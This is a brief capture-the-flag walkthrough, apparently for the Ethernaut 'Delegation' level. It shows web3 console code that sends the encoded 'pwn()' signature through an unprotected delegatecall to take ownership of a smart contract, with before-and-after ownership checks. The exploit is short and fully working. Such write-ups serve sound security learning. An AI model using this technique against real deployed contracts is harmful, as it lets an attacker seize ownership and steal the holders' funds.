# Delegation

Use unprotected ``delegatecall`` function to execute vulnerable code.

Type in the browser console:

```
> await contract.owner() == player
false
```

Execute following code:

```
var encodedTransactionData = web3.eth.abi.encodeFunctionSignature('pwn()');
await contract.sendTransaction({ from: player, data: encodedTransactionData });
```

Type in the browser console:

```
> await contract.owner() == player
true
```

Level completed.
